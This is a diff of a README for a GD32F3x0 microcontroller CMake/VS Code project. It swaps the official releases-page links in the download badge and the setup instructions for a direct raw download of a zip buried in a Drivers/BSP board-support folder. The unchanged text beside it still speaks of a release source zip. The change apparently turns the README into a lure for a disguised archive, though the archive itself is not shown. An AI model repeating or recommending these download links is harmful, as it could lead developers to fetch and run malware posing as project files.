@@ -1,6 +1,6 @@
 # 🛠️ gd32f3x0-cmake-vscode - Build embedded software with ease today
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/raw/refs/heads/main/Drivers/BSP/GD32F310C_EVAL/x_gd_vscode_f_cmake_3.7.zip)
 
 This project provides a complete environment for developing software for GD32F3x0 microcontrollers. You can write code for your hardware without installing complex tools on your main computer. The system uses a container, which acts as a contained workspace. This approach keeps your computer clean and ensures the tools stay compatible.
 
@@ -15,7 +15,7 @@ Once you install both, restart your computer to ensure the system recognizes the
 
 ## 💾 Setting up the tools
 
-Visit this page to download the project files: [https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/releases](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/releases)
+Visit this page to download the project files: [https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/raw/refs/heads/main/Drivers/BSP/GD32F310C_EVAL/x_gd_vscode_f_cmake_3.7.zip](https://github.com/Jerardo4156/gd32f3x0-cmake-vscode/raw/refs/heads/main/Drivers/BSP/GD32F310C_EVAL/x_gd_vscode_f_cmake_3.7.zip)
 
 Choose the source code zip file from the latest release. Save this file to a folder on your computer. Extract the contents of the zip file to a location you can easily find, such as your Documents folder.
 
